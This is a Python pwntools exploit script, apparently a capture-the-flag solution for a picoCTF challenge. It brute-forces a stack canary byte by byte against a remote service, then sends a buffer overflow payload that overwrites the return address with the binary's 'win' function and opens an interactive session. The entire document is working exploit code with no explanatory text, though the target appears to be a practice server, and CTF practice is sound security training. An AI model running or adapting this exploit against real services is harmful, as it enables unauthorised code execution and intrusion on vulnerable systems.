from pwn import *
import string

context.binary = exe = ELF('./vuln')

payload = b'i'*64
canary = b''
while(len(canary) != 4):
    log.info(f'Canary value: {canary}')
    for c in string.printable:
        io = remote('saturn.picoctf.net', 51489)
        io.sendlineafter(b'> ', b'1000')
        c = c.encode()
        io.sendafter(b'Input> ', payload+canary+c)
        if b'Ok...' in io.recvline():
            canary += c
            io.close()
            break
        io.close()
log.info(f'Canary value: {canary}')

io = remote('saturn.picoctf.net', 51489)
io.sendlineafter(b'> ', b'1000')
payload = b'i'*64 + canary + b'i'*16 + p32(exe.sym['win'])
io.sendafter(b'Input> ', payload)
io.interactive()